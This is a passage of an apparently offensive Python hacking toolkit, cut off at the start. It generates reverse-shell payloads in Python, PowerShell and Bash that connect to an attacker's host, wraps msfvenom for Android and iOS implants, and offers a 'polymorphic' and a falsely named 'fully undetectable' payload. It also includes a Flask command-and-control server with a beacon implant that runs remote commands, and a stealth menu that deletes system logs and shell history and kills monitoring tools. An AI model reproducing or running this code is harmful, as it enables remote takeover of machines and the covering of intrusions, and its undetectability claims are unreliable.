        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o phantom.apk")
        print("[+] Android Phantom created: phantom.apk")
        
    def python_void(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        
        payload = f"""#!/usr/bin/env python3
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
"""
        filename = f"{self.core.shadow_dir}/void_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        print(f"[+] Python Void created: {filename}")
        
    def polymorphic_abomination(self):
        """Create polymorphic payload that mutates each run"""
        print("[+] Forging polymorphic abomination...")
        
        junk_vars = [''.join(random.choices(string.ascii_letters, k=10)) for _ in range(random.randint(5, 20))]
        junk_funcs = []
        
        for i in range(random.randint(5, 15)):
            func_name = ''.join(random.choices(string.ascii_letters, k=8))
            junk_funcs.append(f"""
def {func_name}_{i}():
    x = {random.randint(1,1000)}
    y = {random.randint(1,1000)}
    return x * y - {random.randint(1,500)}
""")
        
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        
        polymorphic_code = f"""
#!/usr/bin/env python3
{''.join(junk_funcs)}
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        
        filename = f"{self.core.shadow_dir}/abomination_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(polymorphic_code)
        print(f"[+] Polymorphic abomination created: {filename}")
        
    def fud_void(self):
        """Fully Undetectable Payload with encryption"""
        print("[+] Forging FUD void payload...")
        
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        payload = f"""
import base64
from Crypto.Cipher import AES
import socket,subprocess,os

key = b"{key}"
cipher = AES.new(key, AES.MODE_EAX)
nonce = cipher.nonce

def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{lhost}",{lport}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

if __name__ == "__main__":
    connect()
"""
        
        filename = f"{self.core.shadow_dir}/fud_void_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(payload)
        print(f"[+] FUD Void payload created: {filename}")
        
    def powershell_ghost(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        
        payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
        filename = f"{self.core.shadow_dir}/ps_ghost_{int(time.time())}.ps1"
        with open(filename, 'w') as f:
            f.write(payload)
        print(f"[+] PowerShell Ghost created: {filename}")
        
    def bash_spectre(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        
        payload = f"""#!/bin/bash
exec 5<>/dev/tcp/{lhost}/{lport}
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
        filename = f"{self.core.shadow_dir}/bash_spectre_{int(time.time())}.sh"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        print(f"[+] Bash Spectre created: {filename}")
        
    def ios_shadow(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        os.system(f"msfvenom -p ios/shell_reverse_tcp LHOST={lhost} LPORT={lport} -o shadow.ipa")
        print("[+] iOS Shadow created: shadow.ipa")

class SpectreC2Module:
    def __init__(self, core):
        self.core = core
        self.spectres = {}
        
    def awaken(self):
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    SPECTRE C2 MODULE                               ║
║              "Command the undead legion"                            ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[1]{Colors.GHOST_WHITE} Awaken C2 Server
{Colors.DECAY_GREEN}[2]{Colors.GHOST_WHITE} List Spectres
{Colors.DECAY_GREEN}[3]{Colors.GHOST_WHITE} Command a Spectre
{Colors.DECAY_GREEN}[4]{Colors.GHOST_WHITE} Mass Command
{Colors.DECAY_GREEN}[5]{Colors.GHOST_WHITE} Summon New Spectre
{Colors.DECAY_GREEN}[6]{Colors.GHOST_WHITE} Return to Core
        """)
        
        choice = input("\nForgottenCore/SpectreC2> ")
        
        if choice == '1':
            self.awaken_server()
        elif choice == '2':
            self.list_spectres()
        elif choice == '3':
            self.command_spectre()
        elif choice == '4':
            self.mass_command()
        elif choice == '5':
            self.summon_spectre()
            
    def awaken_server(self):
        port = int(input("C2 Port (443): ") or "443")
        print(f"[+] Awakening C2 server on port {port}")
        
        from flask import Flask, request, jsonify
        app = Flask(__name__)
        
        @app.route('/spectre', methods=['POST'])
        def spectre_beacon():
            data = request.json
            spectre_id = data.get('spectre_id')
            self.spectres[spectre_id] = {'last_seen': time.time(), 'info': data}
            return jsonify({'status': 'echo'}), 200
            
        @app.route('/command/<spectre_id>', methods=['GET'])
        def get_command(spectre_id):
            return jsonify({'command': 'whoami'}), 200
            
        app.run(host='0.0.0.0', port=port, ssl_context='adhoc')
        
    def list_spectres(self):
        print(f"\n{Colors.BLOOD_RED}Active Spectres:{Colors.END}")
        for sid, info in self.spectres.items():
            print(f"  {sid} - {info.get('ip')} - {info.get('device')}")
            
    def command_spectre(self):
        spectre_id = input("Spectre ID: ")
        command = input("Command to whisper: ")
        print(f"[+] Whisper sent to {spectre_id}")
        
    def mass_command(self):
        command = input("Mass command: ")
        for sid in self.spectres:
            print(f"[+] Whisper to {sid}")
            
    def summon_spectre(self):
        print("[+] Summoning new spectre payload...")
        lhost = input("C2 Server IP: ")
        lport = input("C2 Port: ")
        
        spectre_code = f"""
import requests
import time
import socket
import platform
import json
import subprocess

SPECTRE_ID = socket.gethostname()
C2_URL = "https://{lhost}:{lport}"

def beacon():
    data = {{
        'spectre_id': SPECTRE_ID,
        'ip': socket.gethostbyname(socket.gethostname()),
        'device': platform.platform()
    }}
    try:
        requests.post(f"{{C2_URL}}/spectre", json=data, verify=False)
    except:
        pass

def listen():
    try:
        resp = requests.get(f"{{C2_URL}}/command/{{SPECTRE_ID}}", verify=False)
        if resp.status_code == 200:
            cmd = resp.json().get('command')
            if cmd:
                subprocess.getoutput(cmd)
    except:
        pass

while True:
    beacon()
    listen()
    time.sleep(30)
"""
        filename = f"{self.core.shadow_dir}/spectre_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(spectre_code)
        print(f"[+] Spectre summoned: {filename}")

class CryptStealthModule:
    def __init__(self, core):
        self.core = core
        
    def awaken(self):
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    CRYPT STEALTH MODULE                            ║
║              "Erase from existence"                                 ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[1]{Colors.GHOST_WHITE} Wipe Logs
{Colors.DECAY_GREEN}[2]{Colors.GHOST_WHITE} Hide Process
{Colors.DECAY_GREEN}[3]{Colors.GHOST_WHITE} Kill Traces
{Colors.DECAY_GREEN}[4]{Colors.GHOST_WHITE} MAC Spoof
{Colors.DECAY_GREEN}[5]{Colors.GHOST_WHITE} DNS Poison
{Colors.DECAY_GREEN}[6]{Colors.GHOST_WHITE} Traffic Tunnel
{Colors.DECAY_GREEN}[7]{Colors.GHOST_WHITE} Return to Core
        """)
        
        choice = input("\nForgottenCore/CryptStealth> ")
        
        if choice == '1':
            print("[+] Wiping system logs...")
            os.system("rm -rf /var/log/*")
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            print("[+] Logs erased from existence")
        elif choice == '2':
            pid = input("PID to hide: ")
            os.system(f"echo 0 > /proc/{pid}/oom_adj")
            print(f"[+] Process {pid} hidden")
        elif choice == '3':
            print("[+] Killing trace processes...")
            os.system("killall tcpdump wireshark strace ltrace")
        elif choice == '4':
            iface = input("Interface (eth0): ") or "eth0"
            os.system(f"macchanger -r {iface}")
            print(f"[+] MAC address randomized on {iface}")
        elif choice == '5':
            target = input("Target domain: ")
            redirect = input("Redirect IP: ")
            os.system(f"echo '{redirect} {target}' >> /etc/hosts")
            print(f"[+] DNS poisoned: {target} -> {redirect}")

# Main execution
if __name__ == "__main__":
    core = ForgottenCore()
    core.main_loop()
